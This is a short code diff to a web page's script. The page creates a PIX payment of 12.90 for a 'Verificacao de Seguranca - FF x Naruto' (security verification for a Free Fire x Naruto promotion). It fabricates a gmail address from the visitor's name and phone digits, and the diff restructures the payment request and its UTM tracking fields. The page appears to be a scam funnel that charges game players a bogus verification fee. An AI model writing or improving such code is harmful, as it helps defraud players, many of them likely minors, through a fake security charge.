@@ -223,7 +223,12 @@ var tel=localStorage.getItem('ff_telefone')||sessionStorage.getItem('ff_telefone
 var np=nome.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g,'').replace(/[^a-z0-9]/g,'');
 var email=np+(tel.slice(-4)||'0000')+'@gmail.com';
 var utms=getUTMs();
-fetch('/api/create-pix',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:'12.90',nome:nome,email:email,telefone:tel,product_title:'Verificacao de Seguranca - FF x Naruto',offer_hash:'w1zdcnwb4c',product_hash:'w1zdcnwb4c',utm_source:utms.utm_source,utm_medium:utms.utm_medium,utm_campaign:utms.utm_campaign,utm_term:utms.utm_term,utm_content:utms.utm_content,src:utms.src})})
+fetch('/api/create-pix',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
+    amount:'12.90',nome:nome,email:email,telefone:tel,
+    product_title:'Verificacao de Seguranca - FF x Naruto',
+    plano:'verificacao_seguranca',
+    utms:utms
+})})
 .then(function(r){return r.json();})
 .then(function(data){
 var code=null;
@@ -252,3 +257,4 @@ function startPolling(){pollInterval=setInterval(function(){fetch('/api/check-tx
 </script>
 </body>
 </html>
+
